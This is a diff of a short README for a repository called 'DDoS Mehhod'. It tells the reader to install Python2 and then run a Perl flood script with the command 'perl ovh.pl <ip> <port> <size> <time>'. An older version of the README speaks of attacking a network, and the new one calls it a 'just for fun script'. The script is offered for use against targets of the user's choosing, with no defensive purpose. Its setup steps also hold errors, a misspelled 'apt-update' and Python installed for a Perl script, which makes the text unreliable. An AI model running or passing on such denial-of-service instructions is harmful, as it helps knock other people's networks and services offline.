@@ -1,5 +1,16 @@
 # DDoS Mehhod
 
-1. 1️⃣ Install Python2 on your ubuntu/debian server.
-2. 2️⃣ Run all updates on your server.
-3. 3️⃣ HOLD UP! Now it's time to fuck a network XD use command "perl ovh.pl"
+1. Use the following commands
+```
+sudo apt-update
+sudo apt install python2
+python2 -V
+```
+
+2. Run the special script using next command
+```
+perl ovh.pl <ip> <port> <size> <time>
+```
+
+- [x] Just for fun script
+- [ ] \(Optional) Review https://github.com/iTzRe33d/ddos-method :tada:
